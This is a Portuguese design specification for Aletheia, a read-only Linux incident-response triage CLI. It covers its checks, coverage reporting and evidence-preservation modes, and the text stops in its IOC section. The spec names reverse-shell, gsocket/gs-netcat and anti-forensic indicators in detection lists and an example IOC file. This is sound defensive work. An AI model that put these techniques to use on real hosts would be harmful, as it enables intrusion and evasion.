# Aletheia — spec

> **Status:** implementada. Este documento é o DESENHO — onde a implementação
> divergiu, o motivo está registrado em `TASKS.md`, e a divergência costuma ser
> a parte interessante.
> **Versão da spec:** 0.3 — incorpora as revisões da 0.1 e da 0.2 (ver 17).
>
> **Convenção:** `§N` refere-se **sempre** a uma seção do runbook `VM_SCAN.md`.
> Referências internas a esta spec são escritas sem o símbolo — "ver 5.4", "seção 11".

---

## O nome

`alḗtheia` (ἀλήθεια) — grego para *des-ocultamento*: `a-` (não) + `lḗthē` (esquecimento, ocultação).

O nome não é decorativo. A propriedade central da ferramenta é distinguir **"nada estava escondido"** de **"eu não consegui ver"** — a mesma distinção que o runbook faz na §35.8 ("todos os testes limparem não absolve o host") e na §37.7 (veredito `INDETERMINADO`). Toda a arquitetura abaixo existe para tornar essa distinção estrutural, e não uma questão de disciplina de quem escreve o check.

**Consequência direta:** cobertura incompleta é reportada como resultado, não como detalhe — e afeta o exit code (ver 7.9).

---

## 1. O que é

CLI de **triagem de resposta a incidente em Linux**, que automatiza os checks mecânicos do runbook `VM_SCAN.md` e produz um relatório acionável — humano e legível por máquina.

Onde um check não é automatizável a partir do host (métrica de nuvem, audit do plano de controle, decisão de negócio), a ferramenta **não silencia**: emite orientação manual **parametrizada pelo que ela mesma achou** (PID, caminho, janela temporal, nome da instância).

## 2. O que NÃO é

```
não é antivírus              não tem base de assinatura de família de malware
não é EDR                    não monitora em runtime; é one-shot
não age                      nunca mata processo, apaga arquivo, altera regra ou serviço
não substitui o runbook      cada achado aponta a seção que explica como ler aquilo
não prova limpeza            resultado OK significa "nenhum indicador coberto disparou"
```

O escopo é **triagem**: reduzir de horas para segundos o tempo gasto executando comandos, e apontar onde o operador deve olhar.

---

## 3. Princípios de projeto

```
1. coleta separada de avaliação
   fatos são coletados uma vez; checks são funções puras sobre eles.
   Consequência: testáveis sem root e sem host comprometido.

2. capacidade é declarada, não assumida
   o check declara do que precisa; o motor emite NOT_CHECKED sozinho quando falta.
   Consequência: "não achei" nunca é impresso igual a "não olhei" — e a cobertura
   incompleta chega até o exit code.

3. manual é cidadão de primeira classe
   check não-automatizável produz finding MANUAL com comandos de exemplo já
   preenchidos com o que foi descoberto.

4. sonde, não detecte
   nunca ramifique por nome de distro. Verifique qual caminho/serviço existe.

5. procedência explícita
   todo achado registra se veio de leitura nativa ou de binário do host.

6. nada modifica o host
   nenhum comando altera estado do alvo: não mata, não apaga, não muda regra,
   config ou serviço. Escrita existe apenas em `--out`, e apenas de artefato
   PRÓPRIO (relatório, JSONL, facts, run log) — exceto `preserve`, que é o único que
   copia artefato DO HOST (binário, memória, pcap), e cujo nome diz isso.
   Sem --out, nada é escrito em lugar nenhum.
```

---

## 4. Decisões já tomadas (e por quê)

| Decisão | Motivo |
|---|---|
| **Go**, não bash | binário estático `CGO_ENABLED=0` não passa pelo loader dinâmico: imune a `LD_PRELOAD`/`ld.so.preload` (§7.8) e a binário de sistema trojanizado (§24). Bash depende do userland do host, inclusive para builtins |
| **Go**, não C | tudo que denuncia hook é leitura de arquivo ou syscall. C só seria necessário para módulo de kernel (má ideia em host suspeito) ou programa eBPF (o loader continua sendo Go) |
| nativo, não wrapper de shell | se a ferramenta faz `exec.Command("ss")`, herda a dependência do userland e perde a única vantagem do Go |
| read-only, exceto `preserve` | a ordem §19/§20/§21 é decisão humana; automação de limpeza destrói evidência |
| separação `collect` / `analyze` | minimiza tempo no host comprometido, permite analisar do lado limpo, e o mesmo artefato vira fixture de teste |
| coletor de systemd **baseado em arquivo** | requisito, não otimização: `systemctl` não roda sobre imagem montada, e sem isso o modo `--root` não existe |
| redação de `environ` por padrão | `environ` contém senha, token e chave (§3.6); o dump é artefato que sai do host |

**Limite conhecido:** Go exige **kernel ≥ 2.6.32** (RHEL/CentOS 6+). Hosts RHEL 5 continuam sendo cobertos apenas por script shell — não tente unificar.

---

## 5. Arquitetura

### 5.1. Fluxo

```
flags ──► env.Probe() ──► facts.Collect(env) ──► engine.Run(registry, facts, env) ──► report
             │                   │                        │
             │                   │                        ├─ AUTO    → Finding
             │                   │                        ├─ MANUAL  → Finding + comandos
             │                   │                        └─ skip    → NotChecked(motivo)
             │                   │
             │                   └─ /proc, netlink, /sys, /etc, systemd, pkg — uma passada
             │
             └─ root? procfs? debugfs? bpf? systemd? lockdown? kptr_restrict? relógio? modo?
```

`env.Probe()` roda uma vez e alimenta tanto o motor quanto o rodapé de cobertura. `readiness` é o mesmo probe **renderizado como saída principal** — não é um caminho de código separado.

### 5.2. Modelo de dados

```go
type Severity int // CRITICAL | WARN | INFO | MANUAL | NOT_CHECKED

type Origin string // "native" | "tool:dpkg" | "tool:rpm"

type Check struct {
    ID       string     // "proc.revshell_fd_socket" — estável; é a chave da frota (§23 do runbook)
    Ref      string     // "3.8" — seção do runbook (a da CONCLUSÃO, não a dos insumos)
    Title    string
    Group    string     // subsistema, eixo do --only (ver 6)
    Mode     Mode       // Auto | Manual | AutoWithManualFallback — eixo do --mode
    Sources  SourceSet  // Live | Image | Both
    Requires CapSet     // sem isto, o check NÃO roda      → NOT_CHECKED
    Optional CapSet     // sem isto, o check roda PARCIAL  → cobertura degradada
    FalsePositives []string  // OBRIGATÓRIO: o que dispara isto legitimamente
    Run      func(*Facts, *Env) Result
}

type Result struct {
    Findings []Finding
    Partial  []string   // o que este check NÃO conseguiu cobrir, e por quê
}

type Finding struct {
    ID, Ref, Title string
    Subject   string     // "pid=6574" | "path=/etc/cron.d/x" — identifica a INSTÂNCIA
    Severity  Severity
    Origin    Origin
    Evidence  []string   // linhas de evidência bruta
    NextSteps []string   // comandos concretos, já preenchidos com PID/caminho/janela
}
```

**`FalsePositives` é obrigatório em todo check.** Sem um lugar onde o autor declare a classe de falso positivo, cada check nasce otimista e o operador descobre o ruído no meio do incidente. O campo é impresso no `-v`, no `aletheia checks` e junto do próprio achado — é o que permite descartar em segundos em vez de investigar em minutos.

**Uma finding por instância.** Um check que dispara em N processos emite N findings com o mesmo `ID` e `Subject` distinto. O `ID` estável é o que permite agrupar entre hosts (§23) sem casar texto; o `Subject` é o que preserva o caso individual.

**`AutoWithManualFallback`.** O check roda automaticamente, mas quando **não consegue concluir** emite um finding `MANUAL` em vez de `NOT_CHECKED`. A diferença importa: `NOT_CHECKED` diz "faltou capacidade"; o fallback diz "eu cheguei até onde o host permite, o resto é você quem verifica". A §37 é o caso típico — staging e ferramenta de transferência são automáticos, volume de saída é manual e sai parametrizado com o âncora que a própria execução derivou.

**`Requires` vs `Optional`.** Binário demais quebra a cobertura: §7 roda quase inteira sem root — só `/root/*` e `/etc/shadow` falham. Com `Requires: CapRoot` a seção inteira viraria `NOT_CHECKED` e você perderia 90% por causa de 10%. Por isso `Optional`: o check roda, e o que não deu vai para `Result.Partial`.

### 5.3. Camada de fatos

Coletada **uma vez**, antes de qualquer check:

```go
type Facts struct {
    Host        HostInfo      // kernel, distro, boot time, virt, sincronização de relógio
    Processes   []Process     // exe, exeDeleted, exeMemfd, argv, envKeys, envAllow,
                              // status, fds, maps, cgroup, nsInodes, lstart
    SocketsProc []Socket      // de /proc/net/tcp{,6}
    SocketsNL   []Socket      // de netlink (o que o ss usa por baixo)
    Systemd     SystemdState  // units, timers, .socket, .path, drop-ins — LIDOS DE ARQUIVO
    Users       UserState     // passwd, shadow, groups, sudoers
    Mounts      []Mount
    Kernel      KernelState   // taint, /proc/modules, /sys/module, ftrace, kprobes, bpf
    Pkg         PkgState      // verificação de integridade (lazy)
}
```

O **filesystem não é pré-coletado** — checks que precisam caminham sob orçamento.

> **Bônus arquitetural:** coletar sockets pelos **dois** caminhos (`/proc/net/tcp` **e** netlink) embute o método da divergência da §35.5. Um rootkit que hooka `tcp4_seq_show` pode esquecer o netlink. Bash não consegue fazer isso — não fala netlink.

> **Requisito do coletor de systemd:** parsear unit files, symlinks de `*.wants/` e a ordem de precedência de drop-ins **a partir do filesystem**. Nunca `systemctl`. É o que faz `--root` funcionar de verdade (§5.5) e o que cobre a §7.2 sobre imagem montada.

### 5.4. Redação de segredo

A redação é da **camada de saída**, não do coletor — vale para `facts.json`, para o relatório humano, para o JSONL e para o checklist. O relatório é o que vai para o ticket, o e-mail e o post-mortem, e ele imprime linha de cron com token, comentário de `authorized_keys` e `cmdline` com senha. Redigir só o dump e esquecer o relatório seria proteger o artefato menos exposto.

`Facts` sai do host: vira `facts.json`, vira fixture, vai para o repositório. E `/proc/<pid>/environ` contém "senhas, tokens, URLs privadas e chaves" (§3.6).

```
padrão                 grava os NOMES de todas as variáveis; grava VALOR só da allowlist
allowlist de valor     LD_PRELOAD, LD_LIBRARY_PATH, SSH_CONNECTION, SSH_CLIENT, SSH_TTY,
                       INVOCATION_ID, JOURNAL_STREAM, PATH, GS_*, GSOCKET_*
demais                 "<redacted>"
--unsafe-full-env      grava tudo, em TODAS as saídas — só para captura forense em $IR,
                       nunca para fixture nem para relatório que sai do time
arquivo de saída       criado 0600; herda o tratamento do $IR da §1
fixture no repositório exige redação padrão; o CI recusa fixture com valor fora da allowlist
```

O mesmo vale para `cmdline`: senha em argumento é comum, e `/proc/*/cmdline` é legível por qualquer usuário (§3.5). Nome do binário e argv[0] sempre; resto sob a mesma regra.

### 5.5. NOT_CHECKED estrutural

O check declara `Requires`. O motor confere **antes** de rodar e, se faltar, emite:

```
[NOT_CHECKED] kernel.ftrace_hooks (§35.3) — debugfs não montado
              o resultado limpo desta execução NÃO cobre hook por ftrace
              verificar manualmente:
                mount -t debugfs none /sys/kernel/debug
                cat /sys/kernel/debug/tracing/enabled_functions
```

Capacidades que viram `NOT_CHECKED` ou cobertura parcial:

```
CapRoot        /proc/<pid>/environ, dono de socket, /etc/shadow, /root/*
CapProcfs      tudo de processo
CapDebugfs     ftrace hooks, kprobes  (caminho mudou: /sys/kernel/debug/tracing em kernel
                                       antigo, /sys/kernel/tracing em novo — sondar os dois)
CapBPF         enumeração de eBPF — sem ela, §35.4 fica descoberta por inteiro
CapSystemd     em host sysvinit/upstart, checks de unit não se aplicam
CapPkgDB       sem rpm/dpkg, §24 não roda
CapNetlink     sem netlink, perde-se a divergência da §35.5 (mas /proc/net/tcp ainda vale)
CapFilesystem  ausente em `analyze`: sem disco vivo, os checks que caminham (§8, §16, §25)
               não têm sobre o que rodar
lockdown       bloqueia kallsyms e debugfs mesmo como root
kptr_restrict  zera endereços no kallsyms (o diff por NOME continua válido)
orçamento      teto de arquivos/tempo atingido = NOT_CHECKED, nunca truncamento silencioso
```

### 5.6. Modo `live` vs `image`

`--root /mnt/ir` não é só prefixo de caminho: muda a **fonte disponível**.

```
Live    /proc, netlink, systemd em runtime, processos vivos    tudo
Image   apenas filesystem                                       checks de processo → NOT_CHECKED
```

O check declara `Sources`; o motor decide. Em modo `image` o relatório abre explicando o que aquele modo **ganha**: o kernel é o do analista, então ocultamento de arquivo por hook em `getdents64` simplesmente não acontece (§35.6).

### 5.7. Como um check decide o que é suspeito

São **cinco mecanismos**, com confiabilidade muito diferente. A severidade sai daqui, não do gosto de quem escreveu o check.

**1. Estrutural — a forma É a anomalia.** Não precisa de baseline nem de saber o que é "normal" naquele host. Mas **"estrutural" não quer dizer "sem falso positivo"** — quer dizer que o falso positivo é *enumerável*, e por isso precisa estar no `FalsePositives` do check e ser descartado antes de reportar.

```
fd 0,1,2 no mesmo socket        §3.8 §17   FP: socket activation com StandardInput=socket
                                           tem EXATAMENTE essa forma, por design.
                                           Descarte: pai é PID 1 E existe .socket unit
                                           correspondente
exe → /memfd:                   §3.16      FP: alguns runtimes usam memfd_create para JIT
                                           ou empacotamento. Raro, mas existe
cmdline vazio com exe existente §3.5       FP: processo em meio a exec lê vazio — é corrida.
                                           Descarte: reler antes de reportar
SAÍDA externa E saída interna
  iniciadas pelo MESMO PID      §12.2      pivô. A DIREÇÃO é o que separa do proxy legítimo:
                                           proxy = ENTRADA externa + saída interna
                                           pivô  = SAÍDA  externa + saída interna
```

→ **CRITICAL**, depois de descartada a lista de FP do check

**2. Correlação — cada sinal isolado tem explicação inocente; a conjunção não tem.**

`exe (deleted)` sozinho é **comum**: acontece em toda atualização de pacote com o serviço em execução. Mas `exe (deleted)` **+** socket externo **+** `PPid 1` **+** exe em `~/.cache` não tem leitura inocente. É a lógica da §17, e é por isso que os checks de correlação existem (ver 5.8). → **CRITICAL**

**3. Divergência — perguntar de dois jeitos e comparar.**

```
/proc/net/tcp x netlink              rootkit hooka uma via e esquece a outra   §35.5
contagem de /proc x ps
/sys/module x lsmod                                                            §35.2
módulo carregado sem arquivo em disco
```

Forte porque **não exige saber o que é normal** — apenas que duas vias deveriam concordar. → **CRITICAL** no nível de kernel, **WARN** fora dele

**4. Referência externa — comparar com uma autoridade que existe no host.**

```
base de pacotes       o binário deveria bater com o pacote                     §24
imagem do container   o que difere da imagem (`docker diff`)                   §38.1
SOMBREAMENTO de unit  unit em /etc com o MESMO NOME de uma em /usr/lib —       §7.2
                      /etc/systemd/system é o lugar documentado de unit local:
                      estar lá não é sinal; sobrescrever uma de pacote é
/etc/skel             CONTEXTO para leitura, não achado automático: usuário     §7.6
                      customiza .bashrc e upgrade de distro muda o skel
baseline              se existir                                              §34.7
```

Forte, **mas depende de a autoridade ser confiável** — e é exatamente por isso que existe o rebaixamento por `origin:tool` (ver 7.5): havendo `ld.so.preload`, o `dpkg` deixa de valer como prova. → **WARN** ou **CRITICAL**, conforme o alvo

**5. Heurística de forma e lugar — o mais fraco.**

`exe` em `/tmp` ou `~/.config`, arquivo world-writable, SUID fora do baseline. Tem falso positivo legítimo. → **WARN**, nunca CRITICAL sozinho; só sobe se correlacionar com outro mecanismo.

Detalhe que o `scan-gsocket.sh` já acerta e a spec precisa herdar: `~/.local/bin` e `~/.local/share` são XDG legítimo e **não** são suspeitos por si; o alvo é `~/.config/<dir>/<bin>`.

#### A regra de revisão de todo check

Antes de qualquer check ser aceito como estrutural, ele passa por dois testes — foi exatamente onde sete checks desta spec furaram na primeira redação:

```
1. dispara em host com socket activation?   sshd.socket, docker.socket, systemd em geral
2. dispara em host com containers?          capabilities por padrão, ip_forward=1,
                                            namespaces distintos, cgroups aninhados
```

Falhou em algum: ou o check ganha o descarte correspondente, ou desce de mecanismo.

#### O que a ferramenta deliberadamente NÃO usa para decidir

```
assinatura de malware      não há base de família; não é antivírus (ver 2)
threat intel / reputação   não há rede, por princípio — consulta avisa o atacante (§2.1)
score de anomalia / ML     número agregado esconde a diferença entre 1 crítico e 8 avisos
```

> **A ferramenta não sabe como malware se parece — sabe como estado anômalo de sistema se parece.** É o argumento da §17, e é o motivo de o critério envelhecer bem: você não reconhece uma família específica, reconhece o **formato** de qualquer uma delas.

#### A família anti-forense

O runbook trata isto como nota dentro de outras seções, e por isso é fácil não implementar. Como grupo é coerente e de sinal altíssimo: **"alguém tentou apagar rastro" é um achado por si só**, independente de encontrar o artefato.

```
wtmp/btmp com salto temporal ou tamanho 0          §12    o `last` com buraco
arquivo de log zerado                              §10.1
journal com gap de boot inesperado                 §10.1
.bash_history → /dev/null, ou tamanho 0            §13
HISTFILE desativado, HISTSIZE=0, set +o history    §13    mais forte que grepar `curl|bash`
ctime de log fora da rotação normal                §10.1
chattr +i em authorized_keys/cron, +a em log       §21    `+a` em log é anti-forense puro
mtime antigo com ctime recente (timestomp)         §5.2
```

Vira o grupo `--only antiforense`. Várias são leitura de um arquivo só, então as mais baratas entram também no `wtf` (ver 6.1).

### 5.8. Checks de correlação

Correlação cruza seções: reverse shell é §3.8 + §2 + §17; pivô é §2 + §12.2. Elas moram em `internal/checks/correlate.go`, e a regra é:

> a finding carrega o **`§ref` da conclusão**, não o dos insumos.

Reverse shell reporta `§17`. Pivô reporta `§12.2`. As seções de insumo aparecem em `Evidence`.

É o mecanismo 2 de 5.7 encarnado em código: o valor está na conjunção, não em cada sinal.

### 5.9. Checks manuais parametrizados

Um finding `MANUAL` não imprime comando genérico — preenche com o que a execução descobriu:

```
[MANUAL] exfil.volume (§37.2) — volume de saída não é verificável a partir do host
         âncora derivado desta execução: 2026-04-30 18:20Z ± 2h
           (ctime de /home/node/.config/htop/defunct)
         instância: web-01
         verificar:
           console de métricas → bytes enviados por instância, agrupado por nome
           compare enviado x recebido na janela acima (§37.2 — assimetria)
           audit administrativo do plano de controle (§10.4)
```

É isto que faz a ferramenta cobrir §37, §39, §10.4 e §34.10 — que não são automatizáveis do host, mas são **direcionáveis** pelo que ela achou.

---

## 6. Modos de execução

```bash
aletheia wtf                                 # overview em ~1s: este host está pegando fogo?
aletheia wtf --oneline                       # uma linha por host — para varrer a frota

aletheia scan                                # coleta + análise no host (modo normal)
aletheia scan --root /mnt/ir                 # sobre snapshot montado read-only (§35.6)
aletheia scan --only proc,net,kernel         # escopo em runtime
aletheia scan --json out.jsonl               # JSONL; "-" = stdout
aletheia scan --history /root/ir/runs        # o que REAPARECEU desde a execução anterior (§22)
aletheia scan --mode manual                  # só os checks não-automatizáveis
aletheia scan --ioc incidente.yaml           # varre com os SEUS indicadores (§23, ver 6.5)
aletheia scan --since 2026-04-30T18:00Z      # janela de investigação, transversal (ver 6.6)

aletheia checks                              # catálogo: id, §ref, modo, grupo, Requires

aletheia collect --out facts.json            # só coleta: rápido, mínimo, READ-ONLY
aletheia analyze facts.json                  # só análise: do lado limpo, sem tocar no host

aletheia watch --duration 15m                # o que APARECE e SOME no intervalo (ver 6.2)

aletheia preserve --pid 6574 --out $IR       # ÚNICO comando que escreve (ver 6.3)
aletheia preserve --pcap --host <IP> --duration 60s --out $IR

aletheia baseline --out base.json            # host LIMPO: inventário para diff (§34.7)
aletheia diff base.json                      # deriva do baseline (§36.9, §40.1)
aletheia readiness                           # §0: eu conseguiria responder as 4 perguntas?
```

**Dois eixos independentes de seleção:**

```
--only  <grupos>    subsistema: proc net persist priv integrity kernel app cloud antiforense
--mode  auto|manual modo do check
--checklist         atalho de apresentação: equivale a --mode manual com formato de tarefa
```

Eram um eixo só e não deveriam ser: um check manual de exfiltração é `cloud` **e** manual ao mesmo tempo.

**`--history`** compara com a execução anterior no mesmo diretório e marca cada finding como `novo`, `persiste` ou `RESOLVIDO`. O output que importa na §22 é o **reaparecimento**: achado que sumiu e voltou é sinal de que a persistência não foi removida, e recebe severidade elevada.

**`analyze` cobre menos que `scan`, por construção.** O filesystem não é pré-coletado (ver 5.3), então os checks que caminham disco (§8, §16, §25) não têm sobre o que rodar num `facts.json`. Eles viram `NOT_CHECKED` com motivo explícito — `CapFilesystem` ausente (ver 5.5).

### 6.1. `wtf` — overview em ~1 segundo

Responde uma pergunta diferente do `scan`: **acabei de ser acionado, este host está pegando fogo?**

```
orçamento    ~1s, teto rígido de 2s. Sem caminhar filesystem, sem verificar pacote,
             sem amostragem. O que não couber no prazo vira NOT_CHECKED —
             o wtf não pode mentir para ser rápido
fonte        apenas /proc, tabela de socket e um punhado de leituras de arquivo único
saída        UMA tela. Não é relatório, é resposta
exit code    o mesmo esquema do scan (ver 7.9) — para ordenar a frota por severidade
cobertura    medida contra os 11 checks DO WTF, não contra os 47 do scan (ver 7.9).
             `wtf` completo é 11/11 e sai 0 — senão a triagem de frota nunca mostraria OK
```

**Contexto** (grátis, e é o que enquadra tudo):

```
hostname, kernel, uptime, virtualização
load average           minerador aparece aqui na hora — é o comprometimento nº 1 em VM de nuvem
relógio sincronizado?  se não, todo timestamp abaixo é frágil (§9)
contagem               processos · conexões estabelecidas · listeners fora de loopback
sessões                quem está logado agora (utmp) e os últimos logins (wtmp)
```

**Decisivos, todos da mesma passada em `/proc`** — custo adicional zero:

```
exe → /memfd: ou (deleted)                    §3.16 §3.14
fd 0,1,2 no mesmo socket                      §3.8   descartando socket activation
cmdline vazio com exe existente               §3.5   relendo, para não pegar corrida de exec
argv0 [entre colchetes] com exe existente     §3.5   disfarce de thread de kernel
CapEff fora do esperado para o binário        §3.7   ping tem cap_net_raw; container tem
                                                     conjunto por padrão — comparar, não só ver
exe em /tmp, /dev/shm, ~/.config/<dir>/<bin>  §8     ~/.local é XDG legítimo, não conta
SAÍDA externa + saída interna, mesmo PID      §12.2  pivô — direção é o que separa do proxy
```

**Leituras de um arquivo só, sinal altíssimo:**

```
/etc/ld.so.preload existe             §7.8    um stat; normalmente NÃO existe
tainted com bit 13 (não assinado)     §35.2   sem driver DKMS conhecido — NVIDIA, ZFS e
                                              VirtualBox sujam legitimamente (§35.2)
conta UID 0 além de root              §7.9
campo de senha vazio no shadow        §7.9
listener do systemd SEM .socket unit  §7.2    o listener do PID 1 é o caso NORMAL; a
                                              anomalia é não haver unit correspondente
```

> **Fora do `wtf` por falso positivo, não por orçamento:** `ip_forward=1` é o padrão em todo host com Docker e em todo nó de k8s. Só vale com o contexto de runtime de container, e isso não cabe no orçamento de 1s — fica no `scan`.

**Fora do `wtf`, por orçamento:** varredura de filesystem (§8, §16), SUID/`getcap -r`, `dpkg -V`/`rpm -Va` (§24), amostragem de beacon (§2.7), diff de kallsyms, persistência completa (§7).

Formato:

```
web-01 · 4.19.0-21-amd64 · up 47d · load 8.02 8.14 7.98 ⚠
relógio sincronizado · 2026-08-16T21:44:03Z · 312 proc · 15 estab · 4 listen público

⛔ pid 6574  exe=/home/node/.config/htop/defunct (deleted)
             fd 0,1,2 → socket:[8891234] → 51.91.190.241:443  + /dev/pts/3
             reverse shell. NÃO mate antes de preservar.        §17 §3.8 §3.14
             → aletheia preserve --pid 6574 --out $IR

⛔ /etc/ld.so.preload existe                                     §7.8
⚠  pid 3311 node · socket externo + interno no mesmo processo    §12.2
⚠  UID 0: root, backup                                           §7.9

não verificado: sem root (environ, dono de socket) · bpftool ausente
RESULT: CRITICAL — 11 checks em 0.4s. Isto NÃO é varredura: rode `aletheia scan`
```

> **O rodapé é obrigatório.** `wtf` é o comando com maior risco de ser lido como "host limpo". Sem achado, ele precisa dizer exatamente o contrário:
>
> ```
> ✓ nenhum indicador decisivo em 11 checks (0.4s)
>   isto NÃO significa host limpo (§35.8). Para o resto: aletheia scan
> ```

**Uso principal — triagem de frota, não de host:**

```bash
for h in $(cat hosts.txt); do
  printf '%-12s ' "$h"; ssh "$h" 'sudo /root/ir/aletheia wtf --oneline'
done
```

```
web-01       CRITICAL  revshell(6574) ld.so.preload pivot(3311)
web-02       OK        —
db-01        WARNING   uid0:backup
worker-03    CRITICAL  memfd(8812)
```

Com dezenas de hosts, isto responde **por onde começar** em um minuto — que é a decisão mais cara do início de um incidente de frota (§23).

`quick` é alias documentado de `wtf`, para contexto onde o nome não cabe.

### 6.2. `watch` — o que a triagem one-shot não alcança

Existem dois casos que **nenhum retrato instantâneo pega**, por construção:

```
beacon intermitente   §2.7  conexão que dura 2s a cada 10 min está ausente de 99,7%
                            dos retratos possíveis
processo efêmero      §2.7  nasce, executa, morre entre duas execuções do scan —
                            o PID muda toda vez e o etime é sempre curto
```

```bash
aletheia watch --for 15m --json watch.jsonl
aletheia watch --for 30m --interval 1s --full 30s
```

**Duas cadências, e são duas porque medem coisas diferentes.** A varredura
completa custa ~1,5s medidos e por isso não roda de cinco em cinco segundos; a
amostra de `/proc` e sockets custa 164ms e por isso pode.

```
--interval   amostra: processo novo, processo que saiu, conexão nova, ritmo
--full       varredura dos 70 checks, com o diff no nível do ACHADO
```

> A coleta volátil vem marcada, e o motor de checks **se recusa** a rodar sobre
> ela: um check de unit encontraria zero units e diria "nada encontrado" onde o
> certo é "não olhei". A economia não pode virar falso negativo, então a
> tentativa vira NÃO VERIFICADO com o motivo dito.

Amostra `/proc` e a tabela de socket em intervalo fixo e reporta **o que apareceu e o que sumiu**:

```
PID novo             com exe, argv, cgroup e pai — é o pspy da §32, e funciona sem root
execução             o par (exec, saída) de processos que nasceram e morreram no intervalo
conexão nova         destino, dono, e o DELTA entre aparições do mesmo destino
periodicidade        delta quase constante = automação; irregular = humano (§2.7)
correlação de gatilho o delta medido casa com algum `*/N` de cron ou OnUnitActiveSec? (§7.1)
```

A correlação de gatilho é o que as duas cadências dão juntas e nenhuma sozinha:
a amostra mede o ritmo **de fora**, sem saber de onde vem, e a varredura
completa sabe quais agendamentos existem. Cruzar os dois troca "há automação
aqui" por "é este timer".

Só o que **sai** entra na conta. Conexão de entrada é o outro lado de uma
conversa que alguém abriu conosco, e o "destino" dela é a porta efêmera do
cliente — contá-las faz cada requisição virar um destino novo, e num servidor
com tráfego o beacon fica enterrado.

**Duas restrições, fixadas de propósito:**

```
tempo limitado, NÃO daemon    você roda, ele termina, ele reporta. Mantém o modelo one-shot
                              e evita ciclo de vida próprio, autostart e todos os problemas
                              que isso traz num host comprometido
não compete com falco/tracee  amostragem por polling PERDE processo muito curto. É limitação
                              real e o `watch` precisa dizer isso no rodapé
```

> Detecção contínua de verdade se instala **antes** do incidente, com eBPF (§34.7, §40.1). `watch` é o substituto para quando isso não existe — que é o caso comum, e é justamente por isso que ele vale.

`watch` é read-only: `--json` só recebe o JSONL do que foi observado.

**O que ainda não existe:** `--focus ADDR`, que filtraria a vigília a um destino
conhecido. É conveniência sobre o que já é medido, não capacidade nova — a
periodicidade e a correlação de gatilho funcionam sem ele.

### 6.3. `preserve` — o único comando que escreve

Existe porque a §6 e a §3.16 tornam a ordem irreversível: matar o processo destrói a única cópia de um binário `memfd` ou já apagado do disco. Se `scan` apenas apontasse "preserve antes de matar", o operador teria de montar o comando na hora — e é exatamente aí que a janela se perde.

```
escreve APENAS em --out            nada fora dali, nunca
alvo explícito                     --pid ou --file; jamais varre e preserva sozinho
o que faz                          cp /proc/<pid>/exe · dump de memória nativo · stat ·
                                   sha256 do original E da cópia (cadeia de custódia da §6)
ordem                              stat pelo DESCRITOR já aberto, não pelo caminho — cp -a não
                                   preserva ctime (§5.2), e statear o caminho depois da cópia
                                   pode descrever outro inode se o arquivo for trocado no meio
o que NÃO faz                      não mata, não remove, não desabilita nada
                                   e NÃO executa gcore (ver abaixo)
```

#### Dump de memória — nativo, e no v1

O valor é um só, mas decisivo quando aparece: **o estado descompactado de um binário packed**. `strings` no disco rende quase nada; o C2, o segredo e a config existem apenas em RAM enquanto o processo roda (§5.5, §6). Secundariamente: chave já descriptografada e região RWX anônima com código injetado (§3.10).

```
relevância   decisivo em uma minoria dos casos — e nesses, é a ÚNICA fonte.
             Nos demais, `strings` no exe copiado basta, e `upx -d` resolve o packer
             mais comum (§32)
```

**Dump de memória ≠ ELF core, e a diferença de custo é grande:**

```
dump de memória   ler /proc/<pid>/maps, ler as regiões legíveis de /proc/<pid>/mem,
  ~100 linhas     gravar com índice. NÃO é carregável no gdb — e não precisa ser:
                  o uso real é `strings dump | grep -iE 'gs-netcat|GS_|token'`

ELF core          + PT_LOAD, NT_PRSTATUS, NT_PRPSINFO e ESTADO DOS REGISTRADORES,
  ~400 linhas     que só se obtém via ptrace. Não fazer (ver abaixo)
```

**Por que nativo é MENOS intrusivo que `gcore`** — é isto que decide:

```
gcore faz PTRACE_ATTACH        → seta TracerPid != 0, que é justamente um check DESTA
                                 ferramenta (§3.7): você contamina o host com o indicador
                                 que está procurando
                               → PARA o processo brevemente: visível para watchdog, e
                                 implante sofisticado detecta o trace e pode se autodestruir
                               → falha sob yama ptrace_scope restrito, que a §34.9 recomenda

ler /proc/<pid>/mem como root  → sem attach: não seta TracerPid, não para o processo
                               → não depende de gdb instalado (imagem mínima — §32)
```

O preço é snapshot inconsistente: o processo continua escrevendo enquanto você lê. Para grep de string, irrelevante. Para análise estruturada, o caminho certo é dump de memória **do sistema inteiro** com AVML e Volatility offline (§35.6) — não core de um processo.

> **ELF core carregável no gdb: não fazer.** Exige `ptrace`, que é exatamente o que estamos evitando, e o consumidor que precisaria dessa profundidade trabalha com dump de sistema inteiro (§35.6).

> **Uso além do implante:** dump do processo **da aplicação** pode conter as credenciais que o atacante leu — alimenta a §26 (rotação) e a §37 (alcance).

`scan` nunca chama `preserve`. Ele emite o comando pronto em `NextSteps`, com o PID já preenchido.

#### `preserve --pcap` — captura de tráfego

Cabe na mesma exceção (escreve só em `--out`) e resolve um problema real: em imagem mínima o `tcpdump` não está instalado, e instalá-lo num host suspeito é o que a §32 desaconselha — mexe na base de pacotes, que é a evidência da §24.

```bash
aletheia preserve --pcap --host 51.91.190.241 --duration 60s --out $IR
aletheia preserve --pcap --port 443 --duration 5m --snaplen 0 --out $IR
```

```
implementação   AF_PACKET + escritor de pcap nativos, sobre a syscall da stdlib
por que nativo  libpcap exigiria cgo, e cgo mata o binário estático (ver 4)
filtro          em ESPAÇO DE USUÁRIO, não no kernel: um filtro de kernel errado
                descarta o que foi pedido e a captura sai legitimamente vazia —
                ninguém revisa arquivo vazio. O preço (o kernel entrega tudo) é
                medido e declarado por PACKET_STATISTICS
snaplen         0 = pacote inteiro, como o -s0 da §2.6
loopback        a cópia de TRANSMISSÃO é descartada: ali cada quadro chega duas
                vezes, e gravar as duas dobra a contagem. Só na loopback
promíscuo       NÃO é ligado: alteraria o estado da interface, e a §2.6 trata
                interface promíscua como achado
saída           .pcap + sha256, no mesmo padrão de cadeia de custódia do preserve
```

> **Aviso obrigatório impresso junto da captura:** se houver eBPF hostil em `xdp`/`tc`, **esta captura mente** — o pacote é escondido antes de chegar ao socket (§35.4). Captura confiável é espelhamento **fora** da VM (§2.6). O `.pcap` também pode conter dado sensível em tráfego não-TLS: trate como o resto da coleta (§1).

### 6.4. `--ioc` — os indicadores DESTE incidente

A ferramenta não tem base de assinatura, e não deve ter (ver 2). Mas num incidente concreto **você tem indicadores** — e a §23 inteira consiste em varrer a frota com eles. Sem isso, a ferramenta não cobre a §23 de verdade: você continuaria precisando de um scanner específico em paralelo.

```yaml
# incidente.yaml
ips:     [51.91.190.241]
hashes:  ["sha256:9f2c..."]
paths:   ["*/htop/defunct", "*.dat"]
strings: [GS_ARGS, gs-netcat, gsocket_dso]
